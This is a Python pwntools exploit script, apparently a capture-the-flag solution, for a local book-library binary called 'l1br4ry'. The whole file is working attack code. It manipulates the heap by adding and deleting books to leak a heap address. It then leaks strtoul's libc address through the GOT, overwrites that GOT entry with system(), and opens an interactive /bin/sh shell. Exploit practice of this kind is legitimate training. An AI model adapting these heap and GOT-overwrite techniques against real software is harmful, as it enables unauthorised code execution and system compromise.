from pwn import *
from time import sleep

PROCESS_NAME = 'l1br4ry'
OFFSET_LEAKED_HEAP_ADDRESS = +0x200
STROUL_GOT_ENTRY_ADDRESS = 0x602070
STRTOUL_SYSTEM_OFFSET = +0x9180

def add_book(p, title, description, rating):
	p.sendline('a')

	for elem in [title, rating, description]:
		p.recvuntil(': ')
		p.sendline(str(elem))

def delete_book(p, book_index):
	p.sendline(str(book_index))
	p.recvuntil('> ')
	p.sendline('d')

def make_favorite(p, book_index):
	p.sendline(str(book_index))
	p.recvuntil('> ')
	p.sendline('f')

def edit_book(p, book_index, new_title, new_rating, revision):
	p.sendline(str(book_index))
	p.recvuntil('> ')
	p.sendline('e')

	for elem in [(': ', new_title), ('): ', new_rating), ('n: ', revision)]:
		p.recvuntil(elem[0])
		p.sendline(str(elem[1]))

def main():
	p = process(PROCESS_NAME)
	p.recvuntil('> ')

	with log.progress('Creating books array...') as prog:
		for i in xrange(10):
			prog.status('Book - ' + str(i))
			add_book(p, 'hey' + str(i+1), 'bye', 3)
			p.recvuntil('> ')
			sleep(0.5)

	log.info('Set favorite book as 6')
	make_favorite(p, 5)
	p.recvuntil('> ')

	with log.progress('Deleting books from array...') as prog:
		for i in [8, 7, 6]:
			prog.status('Deletes book - ' + str(i))
			delete_book(p, i)
			p.recvuntil('> ')
			sleep(0.5)

	log.info('Adding one more book...')
	add_book(p, 'hey11', 'bye', 3)
	p.recvline()
	p.recvline()
	p.recvline()
	books_list = p.recvline()
	p.recvuntil('> ')

	# now books array == favorite book.

	# leak heap address
	heap_address = u64(books_list[20:-1] + '\x00'*(8-len(books_list[20:-1])))
	log.success('Leaked heap address - ' + hex(heap_address))
	log.success('Buffer/Favorite Book address - ' + hex(heap_address + OFFSET_LEAKED_HEAP_ADDRESS))

	with log.progress('Deleting all books...') as prog:
		for i in xrange(7):
			delete_book(p, 1)
			p.recvuntil('> ')
			sleep(0.5)

	# leak stroul libc address
	log.info('Put strtoul() got entry address as name of the first book.')

	edit_book(p, 0, p64(STROUL_GOT_ENTRY_ADDRESS), 10, "hey")
	p.recvline()
	p.recvline()
	p.recvline()
	p.recvline()
	books_list = p.recvline()
	p.recvuntil('> ')
	stroul_address = u64(books_list[5:-1] + '\x00'*(8-len(books_list[5:-1])))
	log.success('Leaked stroul address - ' + hex(stroul_address))

	system_address = stroul_address + STRTOUL_SYSTEM_OFFSET
	log.success('system() address - ' + hex(system_address))

	# overwrite strtoul got.plt entry
	log.info('Overwrite strtoul() got entry with system() address')
	edit_book(p, 1, p64(system_address), '', '')
	p.recvuntil('> ')

	# get fucking shell
	p.sendline('/bin/sh')
	log.success('Baim !')

	p.sendline('id')

	p.interactive()

if __name__ == '__main__':
	main()

 